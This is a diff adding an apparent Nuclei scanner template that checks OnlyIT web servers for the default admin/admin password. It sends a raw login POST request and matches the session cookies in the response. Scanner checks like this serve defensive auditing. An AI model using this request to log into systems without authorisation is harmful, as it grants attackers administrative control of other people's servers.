@@ -1,0 +1,53 @@
+id: onlyit-webserver-default-password
+
+info:
+  name: OnlyIT WebServer Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The admin user of the OnlyIT system has a default password of admin/admin.
+    An attacker can directly use this password to log in to the system, obtain the background operation authority,
+    and perform sensitive operations.
+  reference:
+    - http://www.onlyit.cn
+  classification:
+    cvss-score: 9.7
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /login?action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfvEVWJnzi8hKmodS
+
+        ------WebKitFormBoundaryfvEVWJnzi8hKmodS
+        Content-Disposition: form-data; name="user_id"
+
+        admin
+        ------WebKitFormBoundaryfvEVWJnzi8hKmodS
+        Content-Disposition: form-data; name="pwd"
+
+        admin
+        ------WebKitFormBoundaryfvEVWJnzi8hKmodS
+        Content-Disposition: form-data; name="tm_type"
+
+        A
+        ------WebKitFormBoundaryfvEVWJnzi8hKmodS
+        Content-Disposition: form-data; name="call_login"
+
+        \xb5\xc7\xcf\xb5\xcd\xb3
+        ------WebKitFormBoundaryfvEVWJnzi8hKmodS--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: session_id"
+          - "Set-Cookie: login_auth_id=admin;"
+          - "Set-Cookie: login_user_id=admin;"
+          - "Location:"
